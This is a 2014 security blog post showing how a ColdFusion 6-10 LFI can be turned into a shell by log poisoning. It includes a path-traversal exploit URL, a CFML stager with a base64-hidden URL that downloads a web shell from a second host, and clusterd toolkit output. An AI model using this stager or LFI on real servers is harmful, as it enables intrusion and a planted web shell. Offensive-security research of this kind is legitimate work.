---
categories:
- coldfusion
- lfi
- clusterd
comments: false
date: "2014-04-02T15:10:04Z"
title: LFI to shell in Coldfusion 6-10
---

ColdFusion has [several](http://www.blackhatlibrary.net/Coldfusion_hacking) very popular LFI's that are often used to fetch CF hashes, which can then be passed or cracked/reversed.  A lesser use of this LFI, one that I haven't seen documented as of yet, is actually obtaining a shell.  When you can't crack or pass, what's left?

The less-than-obvious solution is to exploit CFML's parser, which acts much in the same way that PHP does when used in HTML.  You can embed PHP into any HTML page, at any location, because of the way the PHP interpreter searches a document for executable code.  This is the foundational basis of log poisoning.  CFML acts in much the same way, and we can use these LFI's to inject CFML and execute it on the remote system.

Let's begin by first identifying the LFI; I'll be using ColdFusion 8 as example.  CF8's LFI lies in the locale parameter:

```
http://192.168.1.219:8500/CFIDE/administrator/enter.cfm?local=../../../../../../../../ColdFusion8\logs\application.log%00en
```

When exploited, this will dump the contents of `application.log`, a logging file that stores error messages.

{{< figure src="/images/posts/2014/cf_log.jpg" >}}

We can write to this file by triggering an error, such as attempting to access a nonexistent CFML page.  This log also fails to sanitize data, allowing us to inject any sort of characters we want; including CFML code.  

The idea for this is to inject a simple stager payload that will then pull down and store our real payload; in this case, a web shell (something like fuze).  The stager I came up with is as follows:

```
<cfhttp method='get' url='#ToString(ToBinary('aHR0cDovLzE5Mi4xNjguMS45Nzo4MDAwL2NtZC5jZm1s'))#' path='#ExpandPath(ToString(ToBinary('Li4vLi4v')))#' file='cmd.cfml'>
```

The `cfhttp` tag is used to execute an HTTP request for our real payload, the URL of which is base64'd to avoid some encoding issues with forward slashes.  We then expand the local path to `../../` which drops us into `wwwroot`, which is the first directory accessible from the web server. 

Once the stager is injected, we only need to exploit the LFI to retrieve the log file and execute our CFML code:

{{< figure src="/images/posts/2014/cf_log_fetch.jpg" >}}

Which we can then access from the root directory:

{{< figure src="/images/posts/2014/cf_log_exec.jpg" >}}

A quick run of this in clusterd:

```
$ ./clusterd.py -i 192.168.1.219 -a coldfusion -p8500 -v8 --deployer lfi_stager --deploy ./src/lib/resources/cmd.cfml 

        clusterd/0.2.1 - clustered attack toolkit
            [Supporting 5 platforms]

 [2014-04-02 11:28PM] Started at 2014-04-02 11:28PM
 [2014-04-02 11:28PM] Servers' OS hinted at windows
 [2014-04-02 11:28PM] Fingerprinting host '192.168.1.219'
 [2014-04-02 11:28PM] Server hinted at 'coldfusion'
 [2014-04-02 11:28PM] Checking coldfusion version 8.0 ColdFusion Manager...
 [2014-04-02 11:28PM] Matched 1 fingerprints for service coldfusion
 [2014-04-02 11:28PM]   ColdFusion Manager (version 8.0)
 [2014-04-02 11:28PM] Fingerprinting completed.
 [2014-04-02 11:28PM] Injecting stager...
 [2014-04-02 11:28PM] Waiting for remote server to download file [7s]]
 [2014-04-02 11:28PM] cmd.cfml deployed at /cmd.cfml
 [2014-04-02 11:28PM] Finished at 2014-04-02 11:28PM

```

The downside to this method is remnance in a log file, which cannot be purged unless the CF server is shutdown (except in CF10).  It also means that the CFML file, if using the web shell, will be hanging around the filesystem.  An alternative is to inject a web shell that exists on-demand, that is, check if an argument is provided to the LFI and only parse and execute then.

A working deployer for this can be found in the latest release of clusterd (v0.2.1).  It is also worth noting that this method is applicable to other CFML engines; details on that, and a working proof of concept, in the near future.
